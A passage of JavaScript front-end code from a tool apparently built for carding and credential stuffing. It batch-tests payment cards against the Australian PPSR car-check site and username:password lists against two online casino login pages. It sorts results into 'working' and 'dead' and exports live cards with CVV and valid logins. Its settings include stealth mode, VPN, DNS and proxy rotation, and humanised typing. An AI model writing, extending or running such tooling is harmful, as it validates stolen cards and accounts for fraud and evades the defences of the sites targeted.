  toast(`${siteName}: ${working} working, ${noAcc} no acc/disabled of ${done} checked`, working > 0 ? 'success' : 'info', 4000);
  renderAll();
}

/**
 * Aborts any active login check run for the given site. Resets all TESTING credentials back
 * to UNTESTED so they can be re-run. Stops the active recording if it belongs to this run.
 * BUG-08 fix: awaits stopRunRecording instead of fire-and-forget void.
 * @param {'joe'|'ign'} site - Site identifier.
 */
async function stopLoginChecks(site) {
  if (site === 'joe') {
    if (state.joeAbortController) state.joeAbortController.abort();
    state.joeRunning = false;
    state.joeAbortController = null;
    state.joeCreds.forEach(c => { if (c.status === CredStatus.TESTING) c.status = CredStatus.UNTESTED; });
    saveJoeCreds();
  } else {
    if (state.ignAbortController) state.ignAbortController.abort();
    state.ignRunning = false;
    state.ignAbortController = null;
    state.ignCreds.forEach(c => { if (c.status === CredStatus.TESTING) c.status = CredStatus.UNTESTED; });
    saveIgnCreds();
  }
  hideProgress();
  if (state.recordingActive && state.recordingActive.runType === site) {
    await stopRunRecording(state.recordingActive.id, 'stopped');
  }
  renderAll();
  toast('Stopped', 'info');
}

// ── Run PPSR checks ────────────────────────────────────────
/**
 * Starts a batched virtual headless PPSR card check run.
 * BUG-04 fix: catch blocks reset card status from TESTING back to UNTESTED.
 * BUG-07 fix: uses scheduleRender (RAF-debounced) inside worker loop.
 * BUG-08 fix: awaits stopRunRecording.
 * @param {string[]|null} [cardIds=null] - Specific card IDs to check; null = all untested.
 */
async function runChecks(cardIds = null) {
  if (state.isRunning) return;

  const targets = cardIds
    ? state.cards.filter(c => cardIds.includes(c.id) && c.status !== Status.TESTING)
    : state.cards.filter(c => c.status === Status.UNTESTED);

  if (targets.length === 0) { toast('No untested cards to check', 'info'); return; }

  state.isRunning = true;
  state.abortController = new AbortController();
  const signal = state.abortController.signal;
  const ppsrUrl = state.settings.ppsrUrl || 'https://transact.ppsr.gov.au/CarCheck/';

  showProgress('Running PPSR Checks (Virtual Headless)…');
  renderAll();
  const recordingId = await startRunRecording('ppsr', 'PPSR Check Run');

  const concurrency = Math.min(state.settings.maxConcurrency, targets.length, 8);
  let done = 0, working = 0, dead = 0;
  const queue = [...targets];

  /** @description Worker pulls cards from the shared queue and processes each one. */
  async function worker() {
    while (queue.length > 0 && !signal.aborted) {
      const card = queue.shift();
      if (!card) break;

      const idx = state.cards.findIndex(c => c.id === card.id);
      if (idx === -1) continue;
      state.cards[idx].status = Status.TESTING;
      scheduleRender();

      try {
        const res = await simulateCheckDetailed(state.cards[idx], ppsrUrl);
        if (signal.aborted) break;

        const c = state.cards[idx];
        c.status = res.result === 'working' ? Status.WORKING : res.result === 'dead' ? Status.DEAD : Status.UNTESTED;
        c.totalTests++;
        c.lastTested = Date.now();
        if (res.result === 'working') c.successCount++;
        c.testHistory.unshift({ result: res.result, detail: res.detail, ts: Date.now(), durationMs: res.durationMs });
        if (c.testHistory.length > 50) c.testHistory = c.testHistory.slice(0, 50);

        if (res.result === 'working') working++;
        else if (res.result === 'dead') dead++;

        state.sessions.unshift({
          id: crypto.randomUUID(), type: 'ppsr', cardId: c.id,
          cardNum: c.number, brand: c.brand, result: res.result,
          detail: res.detail, ts: Date.now(), durationMs: res.durationMs,
        });

        const icons = { working: '✅', dead: '❌', error: '⚠️' };
        state.activity.unshift({ icon: icons[res.result] || '❓', label: maskedNumber(c.number), detail: res.detail, ts: Date.now() });
        if (state.activity.length > 100) state.activity = state.activity.slice(0, 100);
        saveActivity();

        done++;
        saveCards();
        saveSessions();
        updateProgress(done, targets.length, '');
        $('progressWorking').textContent = `${working} working`;
        $('progressDead').textContent = `${dead} dead`;
        scheduleRender();
      } catch {
        const idx2 = state.cards.findIndex(c => c.id === card.id);
        if (idx2 !== -1) { state.cards[idx2].status = Status.UNTESTED; saveCards(); }
        done++;
        updateProgress(done, targets.length);
      }
    }
  }

  await Promise.all(Array.from({ length: concurrency }, () => worker()));

  state.isRunning = false;
  state.abortController = null;
  hideProgress();
  await stopRunRecording(recordingId, signal.aborted ? 'stopped' : 'completed');

  toast(`Done: ${working} working, ${dead} dead out of ${done} checked`, working > 0 ? 'success' : 'info', 4000);
  renderAll();
}

/**
 * Aborts any active PPSR check run. Resets all TESTING cards back to UNTESTED.
 * BUG-06 fix: sets state.abortController to null after abort.
 * BUG-08 fix: awaits stopRunRecording.
 */
async function stopRun() {
  if (state.abortController) { state.abortController.abort(); state.abortController = null; }
  state.isRunning = false;
  hideProgress();
  if (state.recordingActive && state.recordingActive.runType === 'ppsr') {
    await stopRunRecording(state.recordingActive.id, 'stopped');
  }
  state.cards.forEach(c => { if (c.status === Status.TESTING) c.status = Status.UNTESTED; });
  saveCards();
  renderAll();
  toast('Stopped', 'info');
}


// ── Export helpers ─────────────────────────────────────────
/**
 * Exports credentials for the given site as a .txt file download.
 * Exports all credentials regardless of status (format: username:password).
 * @param {'joe'|'ign'} site - Site identifier.
 */
function exportCreds(site) {
  const creds = site === 'joe' ? state.joeCreds : state.ignCreds;
  if (creds.length === 0) { toast('No credentials to export', 'info'); return; }
  const text = creds.map(credLabel).join('\n');
  const blob = new Blob([text], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  const siteName = site === 'joe' ? 'joe' : 'ignition';
  a.href = url; a.download = `sitchomatic_${siteName}_${Date.now()}.txt`; a.click();
  URL.revokeObjectURL(url);
  toast(`Exported ${creds.length} credential(s)`, 'success');
}

/**
 * Exports an array of card objects as pipe-delimited lines to a .txt file download.
 * Format per line: NUM|MM|YY|CVV
 * @param {object[]} cards - Array of card objects.
 */
function exportCards(cards) {
  const text = cards.map(cardPipe).join('\n');
  const blob = new Blob([text], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `sitchomatic_cards_${Date.now()}.txt`; a.click();
  URL.revokeObjectURL(url);
  toast(`Exported ${cards.length} card(s)`, 'success');
}

/**
 * Exports all session history as a CSV file download.
 * Columns: identifier, brand_or_site, result, detail, timestamp, duration
 */
function exportSessions() {
  const lines = state.sessions.map(s => {
    const identifier = s.username || s.cardNum || '';
    const extra = s.brand || (s.type || '');
    return [identifier, extra, s.result, s.detail || '', new Date(s.ts).toISOString(), (s.durationMs || 0) + 'ms'].join(',');
  });
  const csv = 'identifier,brand_or_site,result,detail,timestamp,duration\n' + lines.join('\n');
  const blob = new Blob([csv], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `sitchomatic_sessions_${Date.now()}.csv`; a.click();
  URL.revokeObjectURL(url);
  toast(`Exported ${state.sessions.length} session(s)`, 'success');
}

/**
 * Copies text to the clipboard. Falls back to execCommand('copy') if Clipboard API unavailable.
 * @param {string} text - Text to copy.
 */
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => toast('Copied!', 'success', 1500))
    .catch(() => {
      const ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta); ta.select();
      document.execCommand('copy'); ta.remove();
      toast('Copied!', 'success', 1500);
    });
}

// ── Debug Screenshots modal ────────────────────────────────
/**
 * Re-renders the debug screenshots modal list from state.debugShots.
 * Renders thumbnail images, metadata, and action buttons for each shot.
 */
function renderDebugShots() {
  const list = $('screenshotList');
  const empty = $('screenshotsEmpty');
  if (!list || !empty) return;
  if (state.debugShots.length === 0) {
    empty.classList.remove('hidden'); list.innerHTML = ''; return;
  }
  empty.classList.add('hidden');

  // Group shots by groupId, preserving newest-group-first order.
  // Shots are stored newest-first (unshift), so within each group the last
  // screenshot saved (SCR 4/4) appears first — we reverse within each group
  // to restore the natural SCR 1/4 → SCR 4/4 display order.
  const groups = [];
  const groupMap = new Map();
  for (const s of state.debugShots) {
    const gid = s.groupId || s.id;
    if (!groupMap.has(gid)) {
      const g = { groupId: gid, shots: [], ts: s.ts };
      groups.push(g);
      groupMap.set(gid, g);
    }
    groupMap.get(gid).shots.push(s);
  }

  list.innerHTML = groups.map(g => {
    const ordered = [...g.shots].reverse();
    const label = ordered[0]?.note?.split(' — ').slice(0, 2).join(' — ') || g.groupId;
    return `
    <div class="shot-group">
      <div class="shot-group-header">
        <span class="shot-group-label">${label}</span>
        <span class="shot-group-time">${timeAgo(g.ts)}</span>
      </div>
      <div class="shot-group-row">
        ${ordered.map(s => `
          <div class="shot-card">
            <img class="shot-thumb" src="${s.dataUrl}" alt="${s.note}" loading="lazy" data-shot-action="open" data-shot-id="${s.id}" />
            <div class="shot-meta">
              <div class="shot-sub">${s.note || ''}</div>
            </div>
            <div class="shot-actions">
              <button class="icon-text-btn" data-shot-action="open" data-shot-id="${s.id}">🔍</button>
              <button class="icon-text-btn" data-shot-action="download" data-shot-id="${s.id}">💾</button>
            </div>
          </div>`).join('')}
      </div>
    </div>`;
  }).join('');
}

/** @description Opens the debug screenshots modal and re-renders its contents. */
function openScreenshots() { renderDebugShots(); $('screenshotModal').classList.remove('hidden'); }

/** @description Closes the debug screenshots modal. */
function closeScreenshots() { $('screenshotModal').classList.add('hidden'); }

/**
 * Opens a debug screenshot data URL in a new browser tab.
 * @param {string} id - Screenshot object ID.
 */
function openDebugShot(id) {
  const shot = state.debugShots.find(s => s.id === id);
  if (!shot) return;
  fetch(shot.dataUrl)
    .then(r => r.blob())
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      const win = window.open(blobUrl, '_blank');
      setTimeout(() => URL.revokeObjectURL(blobUrl), 60000);
      if (!win) {
        const a = document.createElement('a');
        a.href = blobUrl; a.target = '_blank'; a.click();
        setTimeout(() => URL.revokeObjectURL(blobUrl), 60000);
      }
    });
}

/**
 * Triggers a file download of a debug screenshot as PNG.
 * @param {string} id - Screenshot object ID.
 */
function downloadDebugShot(id) {
  const shot = state.debugShots.find(s => s.id === id);
  if (!shot) return;
  const a = document.createElement('a');
  a.href = shot.dataUrl; a.download = shot.filename || `sitchomatic_debug_${shot.tag || 'shot'}.png`; a.click();
}

// ── Recordings modal ───────────────────────────────────────
/**
 * Re-renders the recordings modal list from state.recordings.
 * Renders video thumbnails, metadata, and action buttons for each recording.
 */
function renderRecordings() {
  const list = $('recordingsList');
  const empty = $('recordingsEmpty');
  if (!list || !empty) return;
  if (state.recordings.length === 0) {
    empty.classList.remove('hidden'); list.innerHTML = ''; return;
  }
  empty.classList.add('hidden');
  list.innerHTML = state.recordings.map(r => `
    <div class="recording-card">
      <video class="recording-video" src="${r.blobUrl}" controls preload="metadata"></video>
      <div class="recording-meta">
        <div class="recording-title">${r.label}</div>
        <div class="recording-sub">${timeAgo(r.ts)} · ${Math.round((r.durationMs || 0) / 1000)}s · ${formatBytes(r.sizeBytes || 0)} · ${r.reason}</div>
      </div>
      <div class="recording-actions">
        <button class="icon-text-btn" data-rec-action="open" data-rec-id="${r.id}">🔍 Open</button>
        <button class="icon-text-btn" data-rec-action="download" data-rec-id="${r.id}">💾 Save</button>
      </div>
    </div>`).join('');
}

/** @description Opens the recordings modal and re-renders its contents. */
function openRecordings() { renderRecordings(); $('recordingsModal')?.classList.remove('hidden'); }

/** @description Closes the recordings modal. */
function closeRecordings() { $('recordingsModal')?.classList.add('hidden'); }

/**
 * Opens a recording blob URL in a new browser tab.
 * @param {string} id - Recording object ID.
 */
function openRecording(id) {
  const rec = state.recordings.find(r => r.id === id);
  if (!rec) return;
  const a = document.createElement('a');
  a.href = rec.blobUrl; a.target = '_blank'; a.rel = 'noopener noreferrer'; a.click();
}

/**
 * Triggers a file download of a recording as a .webm file.
 * @param {string} id - Recording object ID.
 */
function downloadRecording(id) {
  const rec = state.recordings.find(r => r.id === id);
  if (!rec) return;
  const a = document.createElement('a');
  a.href = rec.blobUrl; a.download = rec.filename || `sitchomatic_run_${sanitizeFilenamePart(rec.runType || 'run')}.webm`; a.click();
}


// ── WireGuard modal functions ──────────────────────────────
/**
 * Opens the WireGuard config paste modal and clears previous input.
 * Users can paste or import a .conf file to add a WireGuard config.
 */
function openWgPasteModal() {
  $('wgPasteText').value = '';
  $('wgPasteFeedback').textContent = '';
  $('wgPasteModal').classList.remove('hidden');
  setTimeout(() => $('wgPasteText').focus(), 50);
}

/** @description Closes the WireGuard paste modal. */
function closeWgPasteModal() { $('wgPasteModal').classList.add('hidden'); }

/**
 * Validates and imports the WireGuard config pasted by the user.
 * Parses the .conf text, validates required fields, and appends to state.wireGuardConfigs.
 * Shows a toast with a helpful error message if validation fails.
 */
function confirmWgPaste() {
  const text = $('wgPasteText').value.trim();
  if (!text) { $('wgPasteFeedback').textContent = 'Please paste a WireGuard .conf'; return; }
  const cfg = parseWireGuardConf('Pasted Config', text);
  if (!cfg) { $('wgPasteFeedback').textContent = 'Invalid WireGuard config — must have [Interface] PrivateKey, [Peer] PublicKey and Endpoint'; return; }
  state.wireGuardConfigs.push(cfg);
  saveWgConfigs();
  closeWgPasteModal();
  renderWgConfigs();
  toast(`WireGuard config added: ${cfg.fileName}`, 'success');
}

/**
 * Handles .conf file import for WireGuard. Reads the file as text and passes to confirmWgPaste.
 * Triggers from the hidden file input linked to the "Import .conf file" button.
 * @param {Event} e - File input change event.
 */
function handleWgFileImport(e) {
  const file = e.target.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = ev => {
    const text = ev.target.result;
    const label = file.name.replace(/\.conf$/i, '') || 'Imported Config';
    const cfg = parseWireGuardConf(label, text);
    if (!cfg) {
      toast('Invalid WireGuard .conf file — must have PrivateKey, PublicKey and Endpoint', 'error'); return;
    }
    state.wireGuardConfigs.push(cfg);
    saveWgConfigs();
    renderWgConfigs();
    toast(`WireGuard config imported: ${cfg.fileName}`, 'success');
  };
  reader.readAsText(file);
  e.target.value = '';
}

/**
 * Removes a WireGuard config from state by index.
 * @param {number} idx - Array index of the config to remove.
 */
function deleteWgConfig(idx) {
  state.wireGuardConfigs.splice(idx, 1);
  saveWgConfigs();
  renderWgConfigs();
  toast('WireGuard config removed', 'info');
}

/**
 * Toggles the active/enabled state of a WireGuard config.
 * Only one config can be active at a time — enabling one disables all others.
 * @param {number} idx - Array index of the config to toggle.
 */
function toggleWgConfig(idx) {
  const isNowActive = !state.wireGuardConfigs[idx].active;
  state.wireGuardConfigs.forEach((c, i) => { c.active = i === idx && isNowActive; });
  saveWgConfigs();
  renderWgConfigs();
  toast(isNowActive ? `WireGuard ${state.wireGuardConfigs[idx].name} enabled` : 'WireGuard disabled', 'info');
}

// ── Event wiring ───────────────────────────────────────────
/**
 * Attaches all DOM event listeners to interactive elements.
 * Called once during boot() after the DOM is ready.
 * Covers: tab navigation, theme toggle, run/stop buttons, import modals, card/credential
 * actions, session controls, debug screenshots, recordings, settings fields, WireGuard,
 * NordLynx key, keyboard shortcuts.
 */
function wireEvents() {
  $all('.tab-btn').forEach(btn => btn.addEventListener('click', () => switchTab(btn.dataset.tab)));

  $('themeToggle').addEventListener('click', () => {
    const next = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
    state.settings.theme = next; applyTheme(next); saveSettings();
  });

  $('closeBanner')?.addEventListener('click', () => {
    state._ipBannerDismissed = true;
    $('ipBanner').classList.add('hidden');
    document.documentElement.style.setProperty('--ip-banner-h', '0px');
  });

  $('runBtn').addEventListener('click', () => runChecks());
  $('stopBtn').addEventListener('click', stopRun);
  $('cancelRunBtn').addEventListener('click', stopAnyRun);

  $('importBtn').addEventListener('click', openImport);
  $('importBtn2')?.addEventListener('click', openImport);
  $('closeImportModal').addEventListener('click', closeImport);
  $('cancelImport').addEventListener('click', closeImport);
  $('confirmImport').addEventListener('click', confirmImport);
  $('importText').addEventListener('input', onImportInput);
  $('importModal').addEventListener('click', e => { if (e.target === $('importModal')) closeImport(); });

  $('clearCardsBtn').addEventListener('click', () => {
    if (state.cards.length === 0) return;
    openConfirm('Clear All Cards', `Remove all ${state.cards.length} card(s)? This cannot be undone.`, () => {
      state.cards = []; state.selectedCardIds.clear(); saveCards(); renderAll(); toast('All cards cleared', 'info');
    });
  });

  $('cardList').addEventListener('click', e => {
    const checkEl = e.target.closest('[data-check]');
    const itemEl  = e.target.closest('.card-item');
    if (!itemEl) return;
    const id = itemEl.dataset.id;
    if (checkEl) {
      if (state.selectedCardIds.has(id)) state.selectedCardIds.delete(id);
      else state.selectedCardIds.add(id);
      renderCards();
    } else { openCardDetail(id); }
  });

  $('checkSelectedBtn').addEventListener('click', () => {
    const ids = [...state.selectedCardIds]; state.selectedCardIds.clear(); runChecks(ids);
  });
  $('exportSelectedBtn').addEventListener('click', () => {
    exportCards(state.cards.filter(c => state.selectedCardIds.has(c.id)));
  });

  $('workingList').addEventListener('click', e => {
    const item = e.target.closest('.card-item');
    if (!item) return;
    const card = state.cards.find(c => c.id === item.dataset.id);
    if (card) copyToClipboard(cardPipe(card));
  });
  $('copyAllBtn').addEventListener('click', () => {
    const working = state.cards.filter(c => c.status === Status.WORKING);
    if (working.length === 0) { toast('No working cards', 'info'); return; }
    copyToClipboard(working.map(cardPipe).join('\n'));
  });

  $all('#tab-sessions .filter-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      $all('#tab-sessions .filter-chip').forEach(b => b.classList.remove('active'));
      btn.classList.add('active'); state.sessionFilter = btn.dataset.filter; renderSessions();
    });
  });
  $all('#tab-joe .filter-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      $all('#tab-joe .filter-chip').forEach(b => b.classList.remove('active'));
      btn.classList.add('active'); state.joeFilter = btn.dataset.filter; renderCredSite('joe');
    });
  });
  $all('#tab-ignition .filter-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      $all('#tab-ignition .filter-chip').forEach(b => b.classList.remove('active'));
      btn.classList.add('active'); state.ignFilter = btn.dataset.filter; renderCredSite('ign');
    });
  });

  $('importJoeBtn').addEventListener('click',  () => openImportCred('joe'));
  $('importJoeBtn2')?.addEventListener('click', () => openImportCred('joe'));
  $('joeRunBtn').addEventListener('click',  () => runLoginChecks('joe'));
  $('joeStopBtn').addEventListener('click', () => stopLoginChecks('joe'));
  $('joeCopyWorkingBtn').addEventListener('click', () => {
    const w = state.joeCreds.filter(c => c.status === CredStatus.WORKING);
    if (w.length === 0) { toast('No working Joe credentials', 'info'); return; }
    copyToClipboard(w.map(credLabel).join('\n'));
  });
  $('joeExportBtn').addEventListener('click', () => exportCreds('joe'));
  $('clearJoeBtn').addEventListener('click', () => {
    if (state.joeCreds.length === 0) return;
    openConfirm('Clear Joe Credentials', `Remove all ${state.joeCreds.length} credential(s)?`, () => {
      state.joeCreds = []; state.selectedJoeIds.clear(); saveJoeCreds(); renderAll(); toast('Joe credentials cleared', 'info');
    });
  });
  $('joeCredList').addEventListener('click', e => {
    const checkEl = e.target.closest('[data-check]');
    const itemEl  = e.target.closest('.card-item');
    if (!itemEl) return;
    const id = itemEl.dataset.id;
    if (checkEl) {
      if (state.selectedJoeIds.has(id)) state.selectedJoeIds.delete(id);
      else state.selectedJoeIds.add(id);
      renderCredSite('joe');
    } else { openCredDetail('joe', id); }
  });
  $('joeCheckSelectedBtn').addEventListener('click', () => {
    const ids = [...state.selectedJoeIds]; state.selectedJoeIds.clear(); runLoginChecks('joe', ids);
  });

  $('importIgnBtn').addEventListener('click',  () => openImportCred('ign'));
  $('importIgnBtn2')?.addEventListener('click', () => openImportCred('ign'));
  $('ignRunBtn').addEventListener('click',  () => runLoginChecks('ign'));
  $('ignStopBtn').addEventListener('click', () => stopLoginChecks('ign'));
  $('ignCopyWorkingBtn').addEventListener('click', () => {
    const w = state.ignCreds.filter(c => c.status === CredStatus.WORKING);
    if (w.length === 0) { toast('No working Ignition credentials', 'info'); return; }
    copyToClipboard(w.map(credLabel).join('\n'));
  });
  $('ignExportBtn').addEventListener('click', () => exportCreds('ign'));
  $('clearIgnBtn').addEventListener('click', () => {
    if (state.ignCreds.length === 0) return;
    openConfirm('Clear Ignition Credentials', `Remove all ${state.ignCreds.length} credential(s)?`, () => {
      state.ignCreds = []; state.selectedIgnIds.clear(); saveIgnCreds(); renderAll(); toast('Ignition credentials cleared', 'info');
    });
  });
  $('ignCredList').addEventListener('click', e => {
    const checkEl = e.target.closest('[data-check]');
    const itemEl  = e.target.closest('.card-item');
    if (!itemEl) return;
    const id = itemEl.dataset.id;
    if (checkEl) {
      if (state.selectedIgnIds.has(id)) state.selectedIgnIds.delete(id);
      else state.selectedIgnIds.add(id);
      renderCredSite('ign');
    } else { openCredDetail('ign', id); }
  });
  $('ignCheckSelectedBtn').addEventListener('click', () => {
    const ids = [...state.selectedIgnIds]; state.selectedIgnIds.clear(); runLoginChecks('ign', ids);
  });

  $('closeImportCredModal').addEventListener('click', closeImportCred);
  $('cancelImportCred').addEventListener('click', closeImportCred);
  $('confirmImportCred').addEventListener('click', confirmImportCred);
  $('importCredText').addEventListener('input', onImportCredInput);
  $('importCredModal').addEventListener('click', e => { if (e.target === $('importCredModal')) closeImportCred(); });

  $('closeCredDetailModal').addEventListener('click', closeCredDetail);
  $('credDetailModal').addEventListener('click', e => { if (e.target === $('credDetailModal')) closeCredDetail(); });
  $('copyCredBtn').addEventListener('click', () => {
    const site = state.detailCredSite;
    const creds = site === 'joe' ? state.joeCreds : state.ignCreds;
    const c = creds.find(x => x.id === state.detailCredId);
    if (c) copyToClipboard(credLabel(c));
  });
  $('deleteCredBtn').addEventListener('click', () => {
    if (!state.detailCredId) return;
    const site = state.detailCredSite;
    openConfirm('Delete Credential', 'Remove this credential?', () => {
      if (site === 'joe') { state.joeCreds = state.joeCreds.filter(c => c.id !== state.detailCredId); saveJoeCreds(); }
      else                { state.ignCreds = state.ignCreds.filter(c => c.id !== state.detailCredId); saveIgnCreds(); }
      closeCredDetail(); renderAll(); toast('Credential deleted', 'info');
    });
  });
  $('checkCredBtn').addEventListener('click', () => {
    const site = state.detailCredSite; const id = state.detailCredId;
    if (!id) return; closeCredDetail(); runLoginChecks(site, [id]);
  });

  $('clearSessionsBtn').addEventListener('click', () => {
    if (state.sessions.length === 0) return;
    openConfirm('Clear Sessions', `Remove all ${state.sessions.length} session records?`, () => {
      state.sessions = []; state.activity = []; saveSessions(); saveActivity(); renderAll(); toast('Sessions cleared', 'info');
    });
  });
  $('exportSessionsBtn').addEventListener('click', exportSessions);
  $('openRecordingsBtn').addEventListener('click', openRecordings);
  $('closeRecordingsModal').addEventListener('click', closeRecordings);
  $('closeRecordingsBtn')?.addEventListener('click', closeRecordings);
  $('recordingsModal').addEventListener('click', e => { if (e.target === $('recordingsModal')) closeRecordings(); });
  $('clearRecordingsBtn').addEventListener('click', () => {
    if (state.recordings.length === 0) return;
    openConfirm('Clear Recordings', `Remove all ${state.recordings.length} recording(s)?`, () => {
      clearAllRecordings(); renderRecordings(); renderSessions(); toast('Recordings cleared', 'info');
    });
  });
  $('recordingsList').addEventListener('click', e => {
    const btn = e.target.closest('[data-rec-action]');
    if (!btn) return;
    const id = btn.dataset.recId;
    if (btn.dataset.recAction === 'open') openRecording(id);
    else if (btn.dataset.recAction === 'download') downloadRecording(id);
  });

  $('openScreenshotsBtn').addEventListener('click', openScreenshots);
  $('closeScreenshotModal').addEventListener('click', closeScreenshots);
  $('closeScreenshotsBtn')?.addEventListener('click', closeScreenshots);
  $('screenshotModal').addEventListener('click', e => { if (e.target === $('screenshotModal')) closeScreenshots(); });
  $('clearScreenshotsBtn').addEventListener('click', () => {
    if (state.debugShots.length === 0) return;
    openConfirm('Clear Debug Screenshots', `Remove all ${state.debugShots.length} screenshot(s)?`, () => {
      state.debugShots = []; saveDebugShotsQuota(); renderDebugShots(); renderSessions(); toast('Debug screenshots cleared', 'info');
    });
  });
  $('screenshotList').addEventListener('click', e => {
    const btn = e.target.closest('[data-shot-action]');
    if (!btn) return;
    const id = btn.dataset.shotId;
    if (btn.dataset.shotAction === 'open') openDebugShot(id);
    else if (btn.dataset.shotAction === 'download') downloadDebugShot(id);
  });

  $('closeDetailModal').addEventListener('click', closeCardDetail);
  $('cardDetailModal').addEventListener('click', e => { if (e.target === $('cardDetailModal')) closeCardDetail(); });
  $('deleteCardBtn').addEventListener('click', () => {
    if (!state.detailCardId) return;
    openConfirm('Delete Card', 'Remove this card?', () => {
      state.cards = state.cards.filter(c => c.id !== state.detailCardId);
      saveCards(); closeCardDetail(); renderAll(); toast('Card deleted', 'info');
    });
  });
  $('checkCardBtn').addEventListener('click', () => {
    const id = state.detailCardId; if (!id) return; closeCardDetail(); runChecks([id]);
  });

  $('confirmCancel').addEventListener('click', closeConfirm);
  $('confirmModal').addEventListener('click', e => { if (e.target === $('confirmModal')) closeConfirm(); });
  $('confirmOk').addEventListener('click', () => { if (state.confirmCallback) state.confirmCallback(); closeConfirm(); });

  $('showKeyBtn').addEventListener('click', () => {
    const inp = $('apiKeyInput');
    inp.type = inp.type === 'password' ? 'text' : 'password';
    $('showKeyBtn').textContent = inp.type === 'password' ? '👁' : '🙈';
  });
  $('saveKeyBtn').addEventListener('click', () => {
    const val = $('apiKeyInput').value.trim();
    if (!val) { toast('Please paste your xai- key first', 'error'); return; }
    if (!val.startsWith('xai-') && !val.startsWith('sk-')) { toast('Key should start with xai- or sk-', 'error'); return; }
    state.grokKey = val; localStorage.setItem(KEY_GROK_API, val);
    $('apiKeyInput').value = ''; $('apiKeyInput').type = 'password'; $('showKeyBtn').textContent = '👁';
    toast('Grok API key saved', 'success'); renderSettings();
  });
  $('deleteKeyBtn').addEventListener('click', () => {
    openConfirm('Remove API Key', 'Remove the saved Grok AI key?', () => {
      state.grokKey = ''; localStorage.removeItem(KEY_GROK_API); toast('API key removed', 'info'); renderSettings();
    });
  });

  const autoBind = (id, key, parser = v => v) => {
    const el = $(id);
    if (!el) return;
    el.addEventListener('change', () => { state.settings[key] = parser(el.value); saveSettings(); });
  };
  autoBind('joeLoginUrl',      'joeLoginUrl');
  autoBind('ignitionLoginUrl', 'ignitionLoginUrl');
  autoBind('maxConcurrency', 'maxConcurrency', v => Math.max(1, Math.min(20, parseInt(v) || 7)));
  autoBind('checkTimeout',   'checkTimeout',   v => Math.max(30, Math.min(300, parseInt(v) || 180)));
  autoBind('testEmail',      'testEmail');
  autoBind('ppsrUrl',        'ppsrUrl');
  autoBind('loginConcurrency', 'loginConcurrency', v => Math.max(1, Math.min(10, parseInt(v) || 3)));
  autoBind('loginTimeout',   'loginTimeout',   v => Math.max(15, Math.min(120, parseInt(v) || 60)));
  autoBind('typingSpeedMin', 'typingSpeedMinMs', v => Math.max(20, Math.min(500, parseInt(v) || 80)));
  autoBind('typingSpeedMax', 'typingSpeedMaxMs', v => Math.max(50, Math.min(1000, parseInt(v) || 180)));
  autoBind('batchDelay',     'batchDelayBetweenStartsMs', v => Math.max(0, Math.min(5000, parseInt(v) || 500)));
  autoBind('pageLoadTimeout', 'pageLoadTimeout', v => Math.max(10, Math.min(120, parseInt(v) || 30)));

  const checkBind = (id, key) => {
    const el = $(id);
    if (!el) return;
    el.addEventListener('change', () => { state.settings[key] = el.checked; saveSettings(); });
  };
  checkBind('autoRetry',         'autoRetry');
  checkBind('stealthMode',       'stealthMode');
  checkBind('useEmailRotation',  'useEmailRotation');
  checkBind('debugScreenshots',  'debugScreenshots');
  checkBind('requeueOnTimeout',  'requeueOnTimeout');
  checkBind('requeueOnFailure',  'requeueOnFailure');
  checkBind('vpnRotation',       'vpnRotation');
  checkBind('dnsRotation',       'dnsRotation');
  checkBind('proxyRotateOnFail', 'proxyRotateOnFailure');

  autoBind('maxRequeueCount', 'maxRequeueCount', v => Math.max(0, Math.min(10, parseInt(v) || 2)));

  $all('.seg-btn[data-theme]').forEach(btn => {
    btn.addEventListener('click', () => { state.settings.theme = btn.dataset.theme; applyTheme(btn.dataset.theme); saveSettings(); });
  });

  $('exportAllBtn').addEventListener('click', () => {
    if (state.cards.length === 0) { toast('No cards to export', 'info'); return; }
    exportCards(state.cards);
  });
  $('exportAllCredsBtn').addEventListener('click', () => {
    const all = [...state.joeCreds, ...state.ignCreds].filter(c => c.status === CredStatus.WORKING);
    if (all.length === 0) { toast('No working credentials to export', 'info'); return; }
    const text = all.map(credLabel).join('\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = `sitchomatic_logins_${Date.now()}.txt`; a.click();
    URL.revokeObjectURL(url);
    toast(`Exported ${all.length} working login(s)`, 'success');
  });

  $('importFileBtn').addEventListener('click', () => $('fileInput').click());
  $('fileInput').addEventListener('change', e => {
    const file = e.target.files[0]; if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      const text = ev.target.result;
      const parsed = smartParseCards(text);
      const existing = new Set(state.cards.map(c => c.number));
      const fresh = parsed.filter(c => !existing.has(c.number));
      if (fresh.length === 0) { toast('No new cards found in file', 'info'); return; }
      state.cards.push(...fresh); saveCards(); toast(`Imported ${fresh.length} card(s)`, 'success'); renderAll();
    };
    reader.readAsText(file); e.target.value = '';
  });

  $('nukeBtn').addEventListener('click', () => {
    openConfirm('Reset All Data', 'This will permanently delete all cards, credentials, sessions, and settings. Are you sure?', () => {
      localStorage.clear();
      state.cards = []; state.sessions = []; state.activity = [];
      clearAllRecordings(); state.debugShots = [];
      state.joeCreds = []; state.ignCreds = [];
      state.blacklist = [];
      state.wireGuardConfigs = []; state.nordAccessKey = '';
      state.grokKey = '';
      state.settings = {
        maxConcurrency: 7, checkTimeout: 180, autoRetry: true, stealthMode: false,
        automationMode: 'virtualHeadless', debugScreenshots: true, testEmail: '',
        ppsrUrl: 'https://transact.ppsr.gov.au/CarCheck/',
        joeLoginUrl: 'https://joefortunepokies.win/login',
        ignitionLoginUrl: 'https://ignitioncasino.ooo/login',
        loginConcurrency: 3, loginTimeout: 60, useEmailRotation: false, theme: 'dark',
        typingSpeedMinMs: 80, typingSpeedMaxMs: 180, requeueOnTimeout: true,
